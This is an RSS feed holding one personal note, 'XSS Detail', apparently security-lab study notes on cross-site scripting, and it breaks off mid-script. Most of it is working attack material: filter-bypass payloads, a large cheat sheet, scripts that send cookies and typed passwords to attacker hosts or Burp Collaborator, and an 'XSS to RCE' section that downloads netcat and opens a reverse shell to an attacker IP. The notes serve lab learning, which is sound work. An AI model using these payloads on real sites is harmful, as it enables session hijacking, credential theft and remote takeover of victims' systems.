<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title></title>
        <link>undefined</link>
        <description>undefined</description>
        <lastBuildDate>Sun, 15 May 2022 07:06:58 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>Joplin Pages Publisher</generator>
        <item>
            <title><![CDATA[XSS Detail]]></title>
            <guid>d52e895463f8406ab609c677bd7c1a62</guid>
            <pubDate>Sat, 23 Oct 2021 03:01:23 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="general">General</h1>
<nav class="table-of-contents"><ul><li><a href="#general">General</a><ul><li><a href="#type">Type</a><ul><li><a href="#reflected">Reflected</a></li><li><a href="#stored">Stored</a></li><li><a href="#dom">DOM</a></li></ul></li><li><a href="#bypass-waf">Bypass WAF</a></li><li><a href="#cheat-sheet">Cheat Sheet</a></li></ul></li><li><a href="#xss-in-other-html-file">XSS in other HTML file</a><ul><li><a href="#iframe">iframe</a></li><li><a href="#custom-tag">Custom Tag</a></li><li><a href="#example">Example</a></li></ul></li><li><a href="#implementation">Implementation</a><ul><li><a href="#general-1">General</a></li><li><a href="#get-html-response">Get HTML response</a></li><li><a href="#steal-cookies">Steal Cookies</a></li><li><a href="#xss-to-rce">XSS to RCE</a></li><li><a href="#create-input-form">Create Input Form</a></li><li><a href="#automatic-post">Automatic POST</a></li><li><a href="#dangling-markup-injection">Dangling Markup Injection</a></li><li><a href="#csp">CSP</a></li></ul></li></ul></nav><blockquote>
<p>xsshunter</p>
</blockquote>
<h2 id="type">Type</h2>
<h3 id="reflected">Reflected</h3>
<p>(1) most tags and attributes blocked
<code>&lt;§&lt;list-of-tags&gt;§%20§&lt;list-of-events&gt;§=1&gt;</code> -&gt; use burp intruder
<sup class="jop-noMdConv"><a title="#fn1" href="#fn1">[1]</a></sup></p>
<p>(2) custom tags
<code>&lt;xss id=x onfocus=alert(document.cookie) tabindex=1&gt;#x';</code> -&gt; custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end focuses on this element as soon as the page is loaded, causing the alert payload to be called.
<sup class="jop-noMdConv"><a title="#fn2" href="#fn2">[2]</a></sup>
<sup class="jop-noMdConv"><a title="#fn3" href="#fn3">[3]</a></sup>
<sup class="jop-noMdConv"><a title="#fn4" href="#fn4">[4]</a></sup></p>
<p>(3) event handlers and href attributes blocked
<code>&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=javascript:alert(1) /&gt;&lt;text x=20 y=20&gt;Click me&lt;/text&gt;&lt;/a&gt;</code>
<sup class="jop-noMdConv"><a title="#fn5" href="#fn5">[5]</a></sup>
<img src="/_resources/4dc996076eba42a183bc7ff08d17dd9d.png" /></p>
<p>(4) SVG markup allowed
<code>§&lt;list-of-tags&gt;§</code> -&gt; <code>&lt;svg&gt;&lt;animatetransform §&lt;list-of-events&gt;§=1&gt;</code> -&gt; <code>&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;</code>
<sup class="jop-noMdConv"><a title="#fn6" href="#fn6">[6]</a></sup></p>
<p>(5) into attribute with angle brackets
if result with input random value is reflected: <code>&lt;input type=text placeholder='Search the blog...' name=search value="agsdsaoldj3u303"&gt;</code>
we can put: <code>"onmouseover="alert(1)</code>
<sup class="jop-noMdConv"><a title="#fn7" href="#fn7">[7]</a></sup></p>
<p>(6) into cannonical link tag
if there is cannonical link tag: <code>&lt;link rel="canonical" href='https://acbd1f051fde3998c0ec08bd00f000c9.web-security-academy.net/'/&gt;</code>
we can put: <code>target.com/?'accesskey='x'onclick='alert(1)</code>
trigger exploit: On Windows: ALT+SHIFT+X, On MacOS: CTRL+ALT+X, On Linux: Alt+X
<sup class="jop-noMdConv"><a title="#fn8" href="#fn8">[8]</a></sup></p>
<p>(7) into JavaScript string with single quote gets backslash escaped
if result with input random value is reflected in script:
input: test12345
<code>&lt;script&gt; var searchTerms = 'test12345'; document.write('&lt;img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'"&gt;'); &lt;/script&gt;</code>
input <code>test 'payload</code> -&gt;
’<img src="/_resources/913bfe644b8c497e9bcca5a000d795c1.png" />
we can put: <code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>
<sup class="jop-noMdConv"><a title="#fn9" href="#fn9">[9]</a></sup></p>
<p>(8) into JavaScript string with HTML encoded
if we put <code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> and result is html encoded:
<code>&lt;script&gt; var searchTerms = '&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;'; document.write('&lt;img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'"&gt;'); &lt;/script&gt;</code>
<code>' ( ) -</code> are not encoded
we can put <code>'-alert(1)-'</code>
<sup class="jop-noMdConv"><a title="#fn10" href="#fn10">[10]</a></sup></p>
<p>(9) into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
if we put <code>'-alert(1)-'</code>
result:
<code>&lt;script&gt; var searchTerms = '\'-alert(1)-\''; document.write('&lt;img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'"&gt;'); &lt;/script&gt;</code>
<code>'</code> is escaped. we can’t use <code>' &lt; &gt; "</code>
we can put <code>\'-alert(1)//</code>
result: <code>var searchTerms = '\\'-alert(1)//';</code>
<sup class="jop-noMdConv"><a title="#fn11" href="#fn11">[11]</a></sup></p>
<p>(10) JavaScript template string angle brackets, single, double quotes, backslash and backticks Unicode-escaped
<code>&lt;script&gt; var message = `0 search results for 'test123'`; document.getElementById('searchMessage').innerText = message; &lt;/script&gt;</code>
we can put <code>${alert(1)}</code>
<sup class="jop-noMdConv"><a title="#fn12" href="#fn12">[12]</a></sup></p>
<p>(11) Reflected XSS in AngularJS
<sup class="jop-noMdConv"><a title="#fn13" href="#fn13">[13]</a></sup>
<sup class="jop-noMdConv"><a title="#fn14" href="#fn14">[14]</a></sup></p>
<h3 id="stored">Stored</h3>
<p>(1) into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
<code>&lt;a id="author" href="http://www.websitexxx.com" onclick="var tracker={track(){}};tracker.track('http://www.websitexxx.com');"&gt;name&lt;/a&gt;</code>
we can put: <code>http://foo?&amp;apos;-alert(1)-&amp;apos;</code>
<sup class="jop-noMdConv"><a title="#fn15" href="#fn15">[15]</a></sup></p>
<p>(2) into href double quotes HTML-encoded
if result with input random value is reflected in href: <code>&lt;a id="author" href="website-xxx"&gt;name-xxx&lt;/a&gt;</code>
we can put: <code>javascript:alert(1)</code>
<sup class="jop-noMdConv"><a title="#fn16" href="#fn16">[16]</a></sup></p>
<h3 id="dom">DOM</h3>
<p>(1) in document.write sink using src
if result with input random value is reflected in
<img src="/_resources/c6037045d2344ee5aa1b4bd5940b99d4.png" />
we can put <code>"&gt;&lt;svg onload=alert(1)&gt;</code>
<sup class="jop-noMdConv"><a title="#fn17" href="#fn17">[17]</a></sup></p>
<p>(2) in document.write sink using source location.search inside a select element (in option)
if the result from <code>academy.net/product?productId=1&amp;storeId=test1234</code> is
<img src="/_resources/a75aa553a6e84ef8b9e2bdc20c066878.png" />
we can put <code>&amp;storeId=&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code>
note:
<code>new URLSearchParams(window.location.search)).get('storeId')</code>
URLSearchParams: interface defines utility methods to work with the query string of a URL
window.location.search: returns the querystring part of a URL, including the question mark (?).
get(‘storeId’): return value of storeId in URL.
continue: go to the next iteration in for loop
<sup class="jop-noMdConv"><a title="#fn18" href="#fn18">[18]</a></sup></p>
<p>(3) in innerHTML sink using source location.search (in span)
<code>web-security-academy.net/?search=test12345</code> -&gt;
<img src="/_resources/541358885892403b9cca2b6fe1c403ea.png" />
we can put <code>&lt;img src=1 onerror=alert(1)&gt;</code>
note:
even if function is on the top, variable definition is executed first.
document.getElementById(‘searchMessage’): get searchMessage ID in html page.
.innerHTML = write to html page based on ID.
<sup class="jop-noMdConv"><a title="#fn19" href="#fn19">[19]</a></sup></p>
<p>(4) in jQuery anchor href attribute sink using location.search source (in href)
<code>academy.net/feedback?returnPath=/test123</code> -&gt;
<img src="/_resources/ec1dd91fba4b4a34b199edba249d30d9.png" />
we can put <code>academy.net/feedback?returnPath=javascript:alert(document.cookie)</code>
note:
<code>$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));</code> : ID backlink, add attribut href with returnPath parameter from URL.
<sup class="jop-noMdConv"><a title="#fn20" href="#fn20">[20]</a></sup></p>
<p>(5) in AngularJS expression with angle brackets and double quotes HTML-encoded (in ng-app)
<code>test12345</code> -&gt;
<img src="/_resources/a265e951913e4732843ed7822bca13e5.png" />
we can put <code>{{$on.constructor('alert(1)')()}}</code>
<sup class="jop-noMdConv"><a title="#fn21" href="#fn21">[21]</a></sup></p>
<p>(6) Reflected DOM XSS (inside string, inside javascript file)
ex.: <code>/search-result?search=XSS</code> generated automatically from javascript.
<img src="/_resources/d67c7802eb874433ad128299dc1da7c6.png" />
<img src="/_resources/1976e837ff204a65999b85a180b0e697.png" />
exploit: <code>\"-alert(1)}//</code>
<sup class="jop-noMdConv"><a title="#fn22" href="#fn22">[22]</a></sup></p>
<p>(7) Stored DOM XSS using replace() (inside <code>&lt;p&gt;</code>)
Input: <code>&lt;img src=1 onerror=alert(1)&gt;</code> -&gt;
<img src="/_resources/2e519bc11c334920a25d4ac5ee439b3b.png" />
Input: <code>comment-xxx</code> -&gt;
<img src="/_resources/eada3e67d4584adfbdde72cdadc77bfd.png" />
We can put <code>&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;</code> -&gt;
<img src="/_resources/aa29f938b63d4b7c88cb80caa2647855.png" />
<code>&lt; &gt;</code> are encoded only on the first occurence
<sup class="jop-noMdConv"><a title="#fn23" href="#fn23">[23]</a></sup></p>
<p>(8) Hash Change event
<img src="/_resources/c2ef65b4c9b941bea9121c9c7470520c.png" />
note:
The location.hash property sets or returns the anchor part of a URL, including the hash sign (#).
exploit, in server:
<code>&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='&lt;img src=x onerror=print()&gt;'"&gt;&lt;/iframe&gt;</code>
<sup class="jop-noMdConv"><a title="#fn24" href="#fn24">[24]</a></sup></p>
<h2 id="bypass-waf">Bypass WAF</h2>
<p><sup class="jop-noMdConv"><a title="#fn25" href="#fn25">[25]</a></sup></p>
<h2 id="cheat-sheet">Cheat Sheet</h2>
<div><pre class="hljs"><code><span class="language-xml">'-alert(1)-'
"-alert(1)-"
xxx"-alert(1)-"xxx
<span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">'XSS'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span>
"/&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
'/&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert(1)&lt;%2fscript&gt;
%22%3E%3Cscript%3Ealert(0)%3C/script%3E
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">ONERROR</span>=<span class="hljs-string">"alert('XSS')"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">print(document.cookie)</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">prompt(document.cookie)</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">oNeRrOr</span>=<span class="hljs-string">alert</span>`<span class="hljs-attr">1</span>`&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"alert`1`"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">ONSELECT</span>=<span class="hljs-string">"alert('XSS')"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">INPUT</span> <span class="hljs-attr">TYPE</span>=<span class="hljs-string">"BUTTON"</span> <span class="hljs-attr">ONCLICK</span>=<span class="hljs-string">"alert('XSS')"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">”javascript:alert(</span>`<span class="hljs-attr">xss</span>`)”&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">IFRAME</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">"javascript:alert('XSS');"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">IFRAME</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://127.0.0.1"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">XSS</span>')&gt;</span>
http" onerror=alert('XSS')
http://a"" onselect=alert('XSS')
"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">animatetransform</span> <span class="hljs-attr">onbegin</span>=<span class="hljs-string">alert(1)</span>&gt;</span>
"&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">"XSS"</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>
&amp;storeId=&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>
javascript:alert(document.cookie)
</span><span class="hljs-template-variable">{{<span class="hljs-name">$on.constructor</span>(<span class="hljs-name">'alert(1)'</span>)()}}</span><span class="language-xml">
\"-alert(1)}//
test.net/post?postId=5&amp;%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
test.net/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
test.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x</span></code></pre></div>
<p>onload bisa ditaro di filename</p>
<div><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span> and <span class="hljs-tag">&lt;/<span class="hljs-name">sCRIpt</span>&gt;</span> 
&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ipt&gt;alert(1)&lt;/scri<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>pt&gt;
<span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>prompt(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-built_in">eval</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-number">97</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">116</span>, <span class="hljs-number">40</span>, <span class="hljs-number">39</span>, <span class="hljs-number">88</span>, <span class="hljs-number">83</span>, <span class="hljs-number">83</span>, <span class="hljs-number">39</span>, <span class="hljs-number">41</span>)) </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
";alert("xss");//
';alert('xss');//
/" onmouseover="alert('xss')
#<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
<p><sup class="jop-noMdConv"><a title="#fn26" href="#fn26">[26]</a></sup>
<sup class="jop-noMdConv"><a title="#fn27" href="#fn27">[27]</a></sup></p>
<h1 id="xss-in-other-html-file">XSS in other HTML file</h1>
<h2 id="iframe">iframe</h2>
<p><code>&lt;iframe src="https://ac371f081fdcdf9ec02904a000ec00d9.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload="this.style.height='1000px';this.style.width='1000px'"&gt;</code></p>
<h2 id="custom-tag">Custom Tag</h2>
<p><code>&lt;script&gt; location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; &lt;/script&gt;</code></p>
<h2 id="example">Example</h2>
<p>(1)
example.com is reflected in data.host:
<img src="/_resources/da14649cad574ee18a5e68047fa93322.png" />
data.host is inside initGeoLocate function:
<img src="/_resources/a7e6ee6f9c3a4a7696d125036bbb5f2e.png" />
initGeoLocate function is inside geolocate.js:
<img src="/_resources/fa67df1b822f4cd3b5ec737715e79310.png" />
exploit:
<img src="/_resources/b027faf5db5249b0b70f2be2bc90108f.png" />
<sup class="jop-noMdConv"><a title="#fn28" href="#fn28">[28]</a></sup></p>
<p>(2) create another json containing XSS imitating original json file
reflection from X-Forwarded-Host header
<img src="/_resources/a92a02b717e540a2b798f67478d581b2.png" />
<img src="/_resources/6e540010277842579af2021533b7e8cd.png" />
inside json file:
<img src="/_resources/3f6b940b84874d95afd2211d3ca89a5b.png" />
exploit:
<img src="/_resources/b1a3e23d9e794638a2ec8b655c685142.png" />
<sup class="jop-noMdConv"><a title="#fn29" href="#fn29">[29]</a></sup></p>
<h1 id="implementation">Implementation</h1>
<h2 id="general-2">General</h2>
<ul>
<li>Popup’s (alert(“Hello World”)) - Creates a Hello World message popup on a users browser.</li>
<li>Writing HTML (document.write) - Override the website’s HTML to add your own (essentially defacing the entire page).</li>
<li>XSS Keylogger (<a title="http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html" href="http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html">http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html</a>) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.</li>
<li>Port scanning (<a title="http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html" href="http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html">http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html</a>) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).</li>
<li>Deface: <code>&lt;script&gt;document.getElementById('thm-title').textContent = 'I am a hacker';&lt;/script&gt;</code></li>
<li>show hostname : <code>&lt;script&gt;alert(window.location.hostname)&lt;/script&gt;</code>
<sup class="jop-noMdConv"><a title="#fn30" href="#fn30">[30]</a></sup></li>
</ul>
<h2 id="get-html-response">Get HTML response</h2>
<p><code>"&gt;&lt;iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)"&gt;</code>
sent to victin:</p>
<div><pre class="hljs"><code>&lt;script&gt;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">xss</span>(<span class="hljs-params">url, text, vector</span>) {
    location = url + <span class="hljs-string">'/login?time='</span>+<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()+<span class="hljs-string">'&amp;username='</span>+<span class="hljs-built_in">encodeURIComponent</span>(vector)+<span class="hljs-string">'&amp;password=test&amp;csrf='</span>+text.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/csrf" value="([^"]+)"/</span>)[<span class="hljs-number">1</span>];
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUrl</span>(<span class="hljs-params">url, collaboratorURL</span>){
    <span class="hljs-title function_">fetch</span>(url).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.<span class="hljs-title function_">text</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span>=&gt;</span>
    {
        <span class="hljs-title function_">xss</span>(url, text, <span class="hljs-string">'"&gt;&lt;iframe src=/admin onload="new Image().src=\''</span>+collaboratorURL+<span class="hljs-string">'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)"&gt;'</span>);
    }
    ))
}

<span class="hljs-title function_">fetchUrl</span>(<span class="hljs-string">"http://$ip"</span>, <span class="hljs-string">"http://$collaboratorPayload"</span>);
&lt;/script&gt;</code></pre></div>
<p><sup class="jop-noMdConv"><a title="#fn31" href="#fn31">[31]</a></sup></p>
<h2 id="steal-cookies">Steal Cookies</h2>
<p>(1)
target’s web:
<code>&lt;script src="http://10.10.14.2/cookie.js"&gt;&lt;/script&gt;</code>
attacker: <code>$ python3 -m http.server 80</code></p>
<div><pre class="hljs"><code><span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> <span class="hljs-title function_">XMLHttpRequest</span>();
request.<span class="hljs-title function_">open</span>(<span class="hljs-string">'GET'</span>, <span class="hljs-string">'http://10.10.14.2/?test='</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>, <span class="hljs-literal">true</span>);
request.<span class="hljs-title function_">send</span>()</code></pre></div>
<p>(2)
target’s web:
<code>new Image().src="http:/10.10.14.12:88/bogus.php?output="%2bdocument.cookie;</code>
attacker: <code>$ nc -nlvp 88</code>
(3)</p>
<div><pre class="hljs"><code>&lt;script&gt;
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net'</span>, {
<span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
<span class="hljs-attr">mode</span>: <span class="hljs-string">'no-cors'</span>,
<span class="hljs-attr">body</span>:<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>
});
&lt;/script&gt;</code></pre></div>
<p><sup class="jop-noMdConv"><a title="#fn32" href="#fn32">[32]</a></sup></p>
<p>(4)
GET request
<code>&lt;script&gt;document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie&lt;/script&gt;</code>
<sup class="jop-noMdConv"><a title="#fn33" href="#fn33">[33]</a></sup></p>
<h2 id="xss-to-rce">XSS to RCE</h2>
<p>(1)
target’s web:
<code>&lt;script src="http://10.10.14.2/shell.js"&gt;&lt;/script&gt;</code>
attacker: <code>$ python3 -m http.server 80</code></p>
<div><pre class="hljs"><code><span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> <span class="hljs-title function_">XMLHttpRequest</span>();
<span class="hljs-keyword">var</span> params = <span class="hljs-string">'cmd=dir|powershell -c "iwr -uri 10.10.14.2/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.2 4444'</span>;
request.<span class="hljs-title function_">open</span>(<span class="hljs-string">'POST'</span>, <span class="hljs-string">'http://localhost/admin/backdoorchecker.php'</span>, <span class="hljs-literal">true</span>);
request.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">'Content-type'</span>, <span class="hljs-string">'application/x-www-form-urlencoded'</span>);
request.<span class="hljs-title function_">send</span>(params);</code></pre></div>
<p>(2)
attacker: <code>$ smbserver.py lab .</code>
target’s web:</p>
<div><pre class="hljs"><code>&lt;script&gt; <span class="hljs-keyword">var</span> x = <span class="hljs-keyword">new</span> <span class="hljs-title function_">XMLHttpRequest</span>(); x.<span class="hljs-title function_">open</span>(<span class="hljs-string">"POST"</span>, <span class="hljs-string">"http://localhost/admin/backdoorchecker.php"</span>, <span class="hljs-literal">true</span>); x.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">"Content-type"</span>, <span class="hljs-string">"application/x-www-form-urlencoded"</span>); x.<span class="hljs-title function_">send</span>(<span class="hljs-string">'cmd=dir asd || \\\\10.10.14.15\\lab\\nc.exe -e cmd.exe 10.10.14.2 4444'</span>);&lt;/script&gt;</code></pre></div>
<p><sup class="jop-noMdConv"><a title="#fn34" href="#fn34">[34]</a></sup></p>
<h2 id="create-input-form">Create Input Form</h2>
<p>target’s web:</p>
<div><pre class="hljs"><code>&lt;input name=username id=username&gt;
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">password</span> <span class="hljs-attr">name</span>=<span class="hljs-string">password</span> <span class="hljs-attr">onchange</span>=<span class="hljs-string">"if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"</span>&gt;</span></span></code></pre></div>
<p>result in collabolator’s body.
<sup class="jop-noMdConv"><a title="#fn35" href="#fn35">[35]</a></sup></p>
<h2 id="automatic-post">Automatic POST</h2>
<p>automatic POST request:
(1) <strong>with anti-CSRF token</strong></p>
<div><pre class="hljs"><code>&lt;script&gt;
<span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title function_">XMLHttpRequest</span>();
req.<span class="hljs-property">onload</span> = handleResponse;
req.<span class="hljs-title function_">open</span>(<span class="hljs-string">'get'</span>,<span class="hljs-string">'/my-account'</span>,<span class="hljs-literal">true</span>);
req.<span class="hljs-title function_">send</span>();
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">var</span> token = <span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/name="csrf" value="(\w+)"/</span>)[<span class="hljs-number">1</span>];
    <span class="hljs-keyword">var</span> changeReq = <span class="hljs-keyword">new</span> <span class="hljs-title function_">XMLHttpRequest</span>();
    changeReq.<span class="hljs-title function_">open</span>(<span class="hljs-string">'post'</span>, <span class="hljs-string">'/my-account/change-email'</span>, <span class="hljs-literal">true</span>);
    changeReq.<span class="hljs-title function_">send</span>(<span class="hljs-string">'csrf='</span>+token+<span class="hljs-string">'&amp;email=test@test.com'</span>)
};
&lt;/script&gt;</code></pre></div>
<p>this will POST <img src="/_resources/3b4a8c1fb61a4add90624023972e7080.png" />
and csrf value is acquired from this <img src="/_resources/c7ffdfcdd44549fcac98624a6e477a62.png" />
<sup class="jop-noMdConv"><a title="#fn36" href="#fn36">[36]</a></sup></p>
<p>(2)
if this form is found on page, this is to do POST request:
<img src="/_resources/b31f690c9b6d4a109db935b2cd8f9892.png" />
sent payload to victim:</p>
<div><pre class="hljs"><code>&lt;script&gt;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">xss</span>(<span class="hljs-params">url, text, vector</span>) {
    location = url + <span class="hljs-string">'/login?time='</span>+<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()+<span class="hljs-string">'&amp;username='</span>+<span class="hljs-built_in">encodeURIComponent</span>(vector)+<span class="hljs-string">'&amp;password=test&amp;csrf='</span>+text.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/csrf" value="([^"]+)"/</span>)[<span class="hljs-number">1</span>];
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUrl</span>(<span class="hljs-params">url</span>){
    <span class="hljs-title function_">fetch</span>(url).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.<span class="hljs-title function_">text</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span>=&gt;</span>
    {
    <span class="hljs-title function_">xss</span>(url, text, <span class="hljs-string">'"&gt;&lt;iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()"&gt;'</span>);
    }
    ))
}

